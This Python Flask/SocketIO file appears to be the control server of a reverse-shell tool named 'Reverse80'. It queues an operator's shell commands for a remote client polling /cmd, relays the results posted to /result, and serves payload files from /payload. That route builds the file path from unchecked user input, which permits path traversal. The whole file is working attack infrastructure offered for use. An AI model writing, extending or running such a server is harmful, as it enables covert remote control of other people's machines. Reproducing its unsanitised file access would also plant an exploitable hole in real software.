from flask import *
from flask_socketio import *

app = Flask(__name__)
socketio = SocketIO(app)

cmd_queque = []

@socketio.on('command')
def handle_command(msg):
    print('received command: ' + msg)
    cmd_queque.append(msg)

@socketio.on('close')
def handle_close():
    global cmd_queque
    cmd_queque = ["exit"]
    print('current shell aborted')

@app.route('/')
def index_page():
    return render_template("main.html")

@app.route('/cmd')
def cmd_page():
    if len(cmd_queque) == 0:
        return ""
    cmd = cmd_queque.pop(0)
    print('sended command: ' + cmd)
    socketio.emit("output", cmd + "\n", broadcast=True)
    return cmd

@app.route('/result', methods=['POST'])
def result_page():
    msg = request.form['output']
    print('command output: ' + msg)
    socketio.emit("output", msg, broadcast=True)
    return "OK"

@app.route('/payload')
def payload_page():
    name = request.args.get("file", "")
    if name == "":
        return ""
    try:
        f = open("payloads/" + name)
    except:
        return ""
    c = f.read()
    f.close()
    return c 

if __name__ == '__main__':
    import os
    port = 5000
    if "PORT" in os.environ:
        port = os.environ["PORT"]
    print("[[ Starting Reverse80 Server ]]")
    socketio.run(app, host="0.0.0.0", port=port)
